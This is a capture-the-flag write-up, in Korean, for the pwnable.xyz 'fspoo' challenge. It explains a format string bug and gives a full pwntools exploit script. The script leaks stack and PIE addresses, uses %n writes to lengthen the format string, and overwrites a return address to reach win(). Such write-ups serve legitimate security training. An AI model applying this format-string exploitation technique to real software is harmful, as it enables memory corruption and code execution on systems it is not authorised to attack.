# [pwnable.xyz] fspoo

> Emojis on the rise

## The Bug

![image](https://github.com/user-attachments/assets/f03b7b20-6fe3-4136-bfc8-5b7bdfac8c1c)

![image](https://github.com/user-attachments/assets/5a892b41-3a0f-46c0-9fa1-df1015860d8f)

`fmt`는 `%s` 앞에 7바이트가 추가된 format string이다.

![image](https://github.com/user-attachments/assets/3fa433f2-9b82-483f-a310-a6519148405a)

`cmd[0x30]`에는 최대 `0x1f`바이트까지 입력할 수 있기 때문에 `sprintf()`로 `cmd`에 복사되는 문자열의 길이는 최대 `0x26`바이트이다.

![image](https://github.com/user-attachments/assets/7dc5a19c-9a61-4526-842b-58cd1986a26d)

따라서 `cmd[0x20]`부터는 임의의 문자열로 채울 수 있고, format string bug가 발생한다.

## Exploit

### Get stack address

`vuln()`의 SFP (`main()`의 `ebp`)를 leak하여 stack address를 구할 수 있다.

![image](https://github.com/user-attachments/assets/1dfe18f2-3387-44a3-ada1-cc3d02ee08d4)

### Get PIE base

`vuln()`의 return address를 leak하여 PIE base를 구할 수 있다.

![image](https://github.com/user-attachments/assets/d2c19f5d-845e-4c77-a074-11ead0357e04)

### Arbitrary address write

![image](https://github.com/user-attachments/assets/53a95635-22fb-4f86-8e65-c0ffb0d07973)

`op`를 이용하여 스택에 임의의 4바이트 값(주소)을 쓸 수 있고, `%n`을 사용하여 이 주소에 값을 쓸 수 있다.

![image](https://github.com/user-attachments/assets/9e5bd8a7-05d9-4e49-ad58-5bf16fea1758)

![image](https://github.com/user-attachments/assets/644b90cc-9572-4593-b370-0cccab08ece5)

### Extend format string

`vuln()`의 return address를 `win()`으로 덮을 수 있다면 바로 플래그를 획득할 수 있지만, format string이 6바이트로 제한되기 때문에 불가능하다. 그래서 먼저 format string의 길이를 늘려 주어야 한다.

![image](https://github.com/user-attachments/assets/7fe624a7-6412-451b-823e-ea1ef0e1d057)

빨간 박스 부분에 null byte가 없도록 채우면 뒤쪽의 `0x1f`바이트도 format string으로 연결된다. 이 길이는 `vuln()`의 return address를 덮기에 충분하다.

### Full code

```python
from pwn import *

r = remote("svc.pwnable.xyz", 30010)

sla = r.sendlineafter
sa = r.sendafter


def edit_name(name):
    sla(b"> ", b"1")
    sa(b"Name: ", name)


def prep_msg():
    sla(b"> ", b"2")


def print_msg():
    sla(b"> ", b"3")


# leak stack address
sa(b"Name: ", b"a" * 0x19 + b"%10$p")
prep_msg()
ebp = int(r.recvn(10)[2:], 16)  # ebp of main()
log.info(f"ebp of vuln(): {hex(ebp)}")

# leak pie
edit_name(b"a" * 0x19 + b"%11$p")
prep_msg()
pie = int(r.recvn(10)[2:], 16) - 0xA77  # pie base
log.info(f"pie base: {hex(pie)}")
cmd = pie + 0x2040
win = pie + 0x9FD

# extend format string
edit_name(b"a" * 0x19 + b"a%6$hn")
sla(b"> ", str((cmd & 0xFFFFFF00) + 2).encode())
for i in range(0x26, 0x30):
    sla(b"> ", str(cmd + i).encode())

# overwrite return address of vuln()
sla(b"> ", str(((ebp - 0xC) & 0xFFFFFF00) + 1 - 0x100000000).encode())
sa(b"Name: ", f"%{str((win & 0xffff) - 0xb)}c%6$hn\x00".encode())
sla(b"> ", str(ebp - 0xC - 0x100000000).encode())

# return vuln() => call win()
sla(b"> ", b"0")

r.interactive()
```

![image](https://github.com/user-attachments/assets/f2703474-59f4-4618-b209-4514e01a1acd)
